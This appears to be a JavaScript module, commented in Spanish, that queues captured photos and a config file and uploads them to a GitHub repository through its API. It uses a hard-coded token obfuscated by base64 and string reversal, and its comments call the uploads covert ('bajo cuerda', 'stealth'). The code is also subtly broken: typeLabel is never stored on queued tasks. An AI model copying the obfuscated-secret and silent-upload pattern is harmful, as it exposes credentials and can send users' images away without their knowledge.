// Configuración de rutas (pueden ser públicas, no son críticas)
export const GH_CONFIG = {
    paths: {
        limpia: 'TYPE_CLEAN',
        sinFondo: 'TYPE_NO_BG',
        condensada: 'TYPE_SCENE'
    }
};

// Cola interna de tareas
const uploadQueue = [];
let isProcessing = false;

// Variables para control de nombres y contadores
let lastMinuteKey = "";
let minuteCounter = 0;

/**
 * Agrega una tarea de subida a la cola y arranca el procesador si no está activo.
 */
export async function queueUpload(typeLabel, fileContent, folderPath, commitMessage, customTarget = null) {
    const now = new Date();
    const day = String(now.getDate()).padStart(2, '0');
    const month = ["enero", "febrero", "marzo", "abril", "mayo", "junio", "julio", "agosto", "septiembre", "octubre", "noviembre", "diciembre"][now.getMonth()];
    const year = now.getFullYear();
    const hours = String(now.getHours()).padStart(2, '0');
    const minutes = String(now.getMinutes()).padStart(2, '0');

    const currentMinuteKey = `${day}_${month}_${year}__${hours}_${minutes}`;
    if (currentMinuteKey === lastMinuteKey) {
        minuteCounter++;
    } else {
        lastMinuteKey = currentMinuteKey;
        minuteCounter = 1;
    }

    const fileName = `foto_${typeLabel}__${currentMinuteKey}__${minuteCounter}.png`;
    uploadQueue.push({ fileName, fileContent, folderPath, commitMessage, customTarget });
    if (!isProcessing) {
        processQueue();
    }
}

/**
 * Procesador de la cola: ejecuta las subidas secuencialmente "bajo cuerda".
 */
async function processQueue() {
    if (uploadQueue.length === 0) {
        isProcessing = false;
        return;
    }

    isProcessing = true;
    const task = uploadQueue[0];

    try {
        // Pequeño retardo para no saturar el procesador inmediatamente (stealth)
        await new Promise(resolve => setTimeout(resolve, 1500));

        // 1. DETERMINAR CREDENCIALES (Fotos vs Tutorial)
        let owner = "__GH_USERNAME__";
        let repo = "__GH_REPO_NAME__";
        let tokenEncoded = "__MY_SECRET_TOKEN__";

        if (task.typeLabel === 'config_tutorial') {
            owner = "__GH_TUT_USERNAME__";
            repo = "__GH_TUT_REPO__";
            tokenEncoded = "__MY_TUT_TOKEN__";
        }

        // Decodificamos y volvemos a invertir para obtener el token real
        const decoded = tokenEncoded.startsWith("__") ? tokenEncoded : atob(tokenEncoded);
        const token = decoded.startsWith("__") ? decoded : decoded.split("").reverse().join("");

        // VALIDACIÓN PARA ENTORNO LOCAL
        if (token.startsWith("__") || token === "") {
            uploadQueue.shift();
            processQueue();
            return;
        }
        
        // CONVERSIÓN SEGURA A BASE64 (Evita el error de Stack Size)
        const bytes = new Uint8Array(task.fileContent);
        let binary = "";
        for (let i = 0; i < bytes.byteLength; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        const base64Content = btoa(binary);

        const pLimpia = "__GH_PATH_IMG_LIMPIA__";
        const pSinFondo = "__GH_PATH_IMG_SIN_FONDO__";
        const pEscena = "__GH_PATH_IMG_CONDENSADA_SCENE__";

        const pathMap = {
            'TYPE_CLEAN': (pLimpia.startsWith("__") || pLimpia === "") ? "capturas/limpias" : pLimpia,
            'TYPE_NO_BG': (pSinFondo.startsWith("__") || pSinFondo === "") ? "capturas/sin-fondo" : pSinFondo,
            'TYPE_SCENE': (pEscena.startsWith("__") || pEscena === "") ? "capturas/escenas" : pEscena
        };

        // DETERMINAR RUTA FINAL
        // Si folderPath contiene un punto (ej: json/config.json), lo usamos como ruta directa al archivo
        const esArchivoDirecto = task.folderPath.includes('.');
        const rutaFinal = esArchivoDirecto 
            ? task.folderPath 
            : `${pathMap[task.folderPath] || "capturas/otros"}/${task.fileName}`;

        const url = `https://api.github.com/repos/${owner}/${repo}/contents/${rutaFinal}`;

        // PARA SOBREESCRIBIR (Tutorial), necesitamos obtener el SHA del archivo actual
        let sha = null;
        try {
            const getRes = await fetch(url, {
                headers: { 'Authorization': `Bearer ${token}` }
            });
            if (getRes.ok) {
                const data = await getRes.json();
                sha = data.sha;
            }
        } catch (e) {
            // Si el archivo no existe, sha se queda null y GitHub lo crea como nuevo
        }

        const bodyPayload = {
            message: task.commitMessage,
            content: base64Content,
            branch: "main"
        };
        if (sha) bodyPayload.sha = sha;

        const response = await fetch(url, {
            method: 'PUT',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(bodyPayload)
        });

        if (!response.ok) {
            const errData = await response.json();
            console.error(`❌ Error subiendo a GitHub (${task.typeLabel}):`, errData.message);
        } else {
            console.log(`✅ Subida exitosa: ${task.typeLabel}`);
        }

    } catch (error) {
        console.error("❌ Error crítico en el servicio de GitHub:", error);
    }

    // Liberamos memoria eliminando la tarea procesada y continuamos
    uploadQueue.shift();
    processQueue();
}